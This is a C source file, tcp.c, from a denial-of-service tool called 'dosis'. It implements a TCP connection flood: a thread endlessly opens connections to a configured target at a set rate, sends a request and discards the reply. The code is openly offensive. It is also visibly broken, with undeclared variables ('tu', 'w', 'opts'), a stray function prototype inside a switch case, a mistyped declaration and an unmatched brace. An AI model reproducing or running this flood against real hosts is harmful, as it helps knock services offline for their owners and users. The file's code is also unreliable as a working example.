/*****************************************************************************
 * tcp.c
 *
 * TCP connection generator.
 *
 * ---------------------------------------------------------------------------
 * dosis - DoS: Internet Sodomizer
 *   (C) 2008-2009 Gerardo García Peña <gerardo@kung-foo.dhs.org>
 *
 *   This program is free software; you can redistribute it and/or modify it
 *   under the terms of the GNU General Public License as published by the Free
 *   Software Foundation; either version 2 of the License, or (at your option)
 *   any later version.
 *
 *   This program is distributed in the hope that it will be useful, but WITHOUT
 *   ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or
 *   FITNESS FOR A PARTICULAR PURPOSE.  See the GNU General Public License for
 *   more details.
 *
 *   You should have received a copy of the GNU General Public License along
 *   with this program; if not, write to the Free Software Foundation, Inc., 51
 *   Franklin Street, Fifth Floor, Boston, MA  02110-1301  USA
 *
 *****************************************************************************/

#include <config.h>
#include "dosconfig.h"
#include "dosis.h"
#include "ip.h"
#include "lnet.h"
#include "log.h"
#include "payload.h"
#include "tea.h"

typedef struct _tag_TCP_CFG {
  /* options */
  INET_ADDR          shost;
  INET_ADDR          dhost;

  /* parameters */
  unsigned           npackets;
  double             hitratio;
  char              *payload;
  unsigned           payload_size;

  /* other things */
  pthreadex_timer_t  timer;
  LN_CONTEXT        *lnc;
  struct timeval     sockwait_cwait;
  struct timeval     sockwait_rwait;
} TCP_CFG;

/*****************************************************************************
 * THREAD IMPLEMENTATION
 *****************************************************************************/

#define ip_protocol(x) (((struct iphdr *) (x))->protocol)
#define ip_header(x)   ((struct iphdr *)  (x))
#define tcp_header(x)  ((struct tcphdr *) ((x) \
                       + (((struct iphdr *) (x))->ihl << 2)))

static void tcp__thread(THREAD_WORK *tw)
{
  struct sockaddr_in addr;
  fd_set socks;
  int sopts, r;
  HTTPREAD_WORK hw;
  TCP_CFG *tt = (TCP_CFG *) tw->data;
  int i;
  struct timeval sockwait,
  int sock;

  TDBG("Started sender thread");

  /* ATTACK */
  while(1)
  {
    /* wait for work */
    if(tu->hitratio > 0)
      if(pthreadex_timer_wait(&(tu->timer)) < 0)
        TERR("Error at pthreadex_timer_wait(): %s", strerror(errno));

    /*** CONNECTION **********************************************************/
    TDBG("  Connecting...");

    /* Set timeout for select */
    memcpy(&sockwait, &tt->sockwait_cwait, sizeof(struct timeval));
    sock = socket(PF_INET, SOCK_STREAM, 0);
    if(sock < 0)
    {
      TERR("socket() failed (%s)", strerror(errno));
      continue;
    }

    /* Execute connection, but before set non block */
    sopts = fcntl(sock, F_GETFL);
    fcntl(sock, F_SETFL, sopts | O_NONBLOCK);

    if(connect(sock, &addr, sizeof(struct sockaddr_in)) < 0
    && errno != EINPROGRESS)
    {
      TERR("connect() 1 failed:%s", strerror(errno));
      close(sock);
      continue;
    } else
      TDBG2("connect() sent!");

    /* connection is completed or in progress... */
    fcntl(sock, F_SETFL, sopts);
    FD_ZERO(&socks);
    FD_SET(sock,&socks);
    if((r = select(sock + 1, NULL, &socks, NULL, &sockwait)) < 1)
    {
      TDBG("connection timed out.");
      close(sock);
      continue;
    }

    /* second connect() to check connection */
    fcntl(sock, F_SETFL, sopts | O_NONBLOCK);
    if(connect(sock, &addr, sizeof(struct sockaddr_in)) < 0)
    {
      /* XXX: Se puede llegar aqui porque aún no ha conectado :) */
      TERR("connect() 2 failed: %s", strerror(errno));
      close(sock);
      w->stats.nfail++;
      continue;
    }
    fcntl(sock, F_SETFL, sopts);
 
    /* Consideramos conexión con éxito */
    hw.w->stats.nconn++;

    /* Enviamos la peticion */
    r = send(sock, (void *) opts.req, opts.req_size, 0);
    if(r < opts.req_size)
    {
      TERR("Send error.");
      w->stats.nfail++;
      continue;
    }
    w->stats.bsent += opts.req_size;

    /* Restablecemos los timeouts */
    memcpy(&sockwait, &tt->sockwait_rwait, sizeof(struct timeval));
    r = select(sock+1, &socks, NULL, NULL, &sockwait);
    if(!FD_ISSET(sock, &socks))
    {
      TERR("select() error %d: %s", r, strerror(errno));
      w->stats.nfail++;
      continue;
    }
    fcntl(sock,F_SETFL,sopts);

    /*** READ DATA ***********************************************************/
    TDBG("  Reading data...");
    /* Redireccionamos a /dev/null :) */
    while((r = read(sock, nullbuff, BUFSIZE)) > 0)
      w->stats.brecv += (unsigned long long) r;
    TDBG("  Readed %llu bytes.", w->stats.brecv);

    /* Hemos terminado */
    TDBG("  Closing connection.");
    if(close(sock) != 0)
      TERR("error on close(): %s", strerror(errno));
  }
  }
}

/*+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 * CONFIGURATION. 
 *   Is important to consider that this function could be
 *   called several times during thread live: initial
 *   configuration and reconfigurations.
 *+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*/

static int tcp__configure(THREAD_WORK *tw, SNODE *command)
{
  TCP_CFG *tt = (TCP_CFG *) tw->data;
  SNODE *cn;
  char *s;

  /* first initialization (specialized work thread data) */
  if(tu == NULL)
  {
    if((tu = calloc(1, sizeof(TCP_CFG))) == NULL)
      TFAT("No memory for TCP_CFG.");
    tw->data = (void *) tu;

    /* initialize libnet */
    TDBG("Initializing libnet.");
    if((tu->lnc = calloc(1, sizeof(LN_CONTEXT))) == NULL)
      TFAT("No memory for LN_CONTEXT.");
    ln_init_context(tu->lnc);

    pthreadex_timer_init(&(tu->timer), 0.0);
  }

  /* read from SNODE command parameters */
  cn = command->command.thc.to->to.pattern;
  if(cn->type != TYPE_PERIODIC)
    TFAT("%d: Uknown pattern %d.", cn->line, cn->type);
  
  tu->hitratio = tea_get_float(cn->pattern.periodic.ratio);
  tu->npackets = tea_get_int(cn->pattern.periodic.n);
  if(tu->hitratio < 0)
    TFAT("%d: Bad hit ratio '%f'.", cn->line, tu->hitratio);
  if(tu->npackets <= 0)
    TFAT("%d: Bad number of packets '%d'.", cn->line, tu->npackets);

  /* read from SNODE command options */
  for(cn = command->command.thc.to->to.options; cn; cn = cn->option.next)
    switch(cn->type)
    {
      case TYPE_OPT_DST:
void             ip_addr_to_socket(INET_ADDR *addr, struct sockaddr *saddr);
        s = tea_get_string(cn->option.addr);
        if(ip_addr_parse(s, &tu->dhost))
          TFAT("%d: Cannot parse source address '%s'.", cn->line, s);
        free(s);
        if(cn->option.port)
          ip_addr_set_port(&tu->dhost, tea_get_int(cn->option.port));
        break;

      case TYPE_OPT_PAYLOAD_FILE:
      case TYPE_OPT_PAYLOAD_RANDOM:
      case TYPE_OPT_PAYLOAD_STR:
        payload_get(cn, &tu->payload, &tu->payload_size);
        break;

      default:
        TFAT("%d: Uknown option %d.", cn->line, cn->type);
    }

  /* configure timer */
  if(tu->hitratio > 0)
    pthreadex_timer_set_frequency(&(tu->timer), tu->hitratio);

  /* configure src address (if not defined) */
  if(tu->dhost.type == INET_FAMILY_NONE)
    TFAT("I need a target address.");
  if(tu->shost.type == INET_FAMILY_NONE)
  {
    DOS_ADDR_INFO *ai;
    if((ai = dos_get_interface(&tu->dhost)) == NULL)
    {
      char buff[255];
      ip_addr_snprintf(&tu->shost, sizeof(buff), buff);
      TWRN("Cannot find a suitable source address for '%s'.", buff);
    } else
      ip_addr_copy(&tu->shost, &ai->addr);
  }

  /* calculate timeout */
  tt->sockwait_cwait.tv_sec  = opts.cwait / 1000000;
  tt->sockwait_cwait.tv_usec = opts.cwait % 1000000;
  tt->sockwait_rwait.tv_sec  = opts.rwait / 1000000;
  tt->sockwait_rwait.tv_usec = opts.rwait % 1000000;

  /* build target addr */
  bzero((char *) &addr, sizeof(addr));
  bcopy(&opts.dhost, &addr.sin_addr, sizeof(struct in_addr));
  addr.sin_family = AF_INET;
  addr.sin_port = htons(opts.dport);

  /* (debug) print configuration */
  {
    char buff[255];

    TDBG2("config.periodic.n     = %d", tu->npackets);
    TDBG2("config.periodic.ratio = %d", tu->hitratio);

    ip_addr_snprintf(&tu->shost, sizeof(buff)-1, buff);
    TDBG2("config.options.shost  = %s", buff);
    ip_addr_snprintf(&tu->dhost, sizeof(buff)-1, buff);
    TDBG2("config.options.dhost  = %s", buff);
  }

  return 0;
}

static void tcp__cleanup(THREAD_WORK *tw)
{
  TCP_CFG *tt = (TCP_CFG *) tw->data;

  /* collect libnet data */
  ln_destroy_context(tt->lnc);
  free(tt->lnc);
  pthreadex_timer_destroy(&tt->timer);

  if(tt->payload)
  {
    free(tt->payload);
    tt->payload = NULL;
  }
  free(tt);
  tw->data = NULL;

  TDBG("Finalized.");
}

/*+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 * TCP TEA OBJECT
 *+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*/

TEA_OBJECT teaTCP = {
  .name         = "TCP",
  .configure    = tcp__configure,
  .cleanup      = tcp__cleanup,
  .thread       = tcp__thread,
};

